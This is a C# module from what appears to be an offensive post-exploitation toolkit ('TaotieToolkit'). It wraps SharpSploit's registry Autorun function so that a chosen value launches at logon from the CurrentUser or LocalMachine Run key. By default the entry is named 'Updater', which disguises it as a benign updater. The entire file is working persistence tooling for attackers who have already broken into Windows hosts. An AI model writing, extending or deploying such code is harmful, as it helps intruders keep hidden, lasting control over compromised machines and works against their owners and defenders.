using ArgParseCS;
using SharpSploit.Credentials;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using TaotieToolkit.config;
using TaotieToolkit.modules.systemcontrol.portforward;

namespace TaotieToolkit.modules.Persistence
{
    internal class Autorun : ICommand, ICommandMarker
    {
        public string Name => "Autorun";
        public string Description => "Windows Registry to establish peristence.";
        private ArgParse argParse;
        private void DefineParams()
        {
            argParse = new ArgParse {
                new OptionSet("Autorun") {
                    new Option("-t", "--type", " CurrentUser or LocalMachine", true, true),
                    new Option("-v", "--Value", "Value to set in the registry", true, true),
                    new Option("-n", "--Name", "Name for the registy value. Defaults to \"Updater\".", false, true),
                },
            };
        }
        public void Execute(string[] args)
        {
            DefineParams();
            if (args.Length == 0)
            {
                argParse.Usage();
                return;
            }
            try
            {
                argParse.Parse(args);
                OptionSet activeOptionSet = argParse.GetActiveOptionSet();
             
                Option option = activeOptionSet.GetOption("-t");
                string type = option.ParamValue;
                if (!"CurrentUser".Equals(type) && !"LocalMachine".Equals(type)) {
                    argParse.Usage();
                    return;
                }
                option = activeOptionSet.GetOption("-v");
                string Value = option.ParamValue;
                option = activeOptionSet.GetOption("-n");
                string Name = option.ParamValue;
                if (SharpSploit.Persistence.Autorun.InstallAutorun(type, Value, Name)) {
                    Console.WriteLine("\t[*] Autorun success");
                }
            }
            catch (Exception exception)
            {
                // User control the exception
                System.Console.WriteLine("exception: " + exception.Message);
            }
        }
    }
}
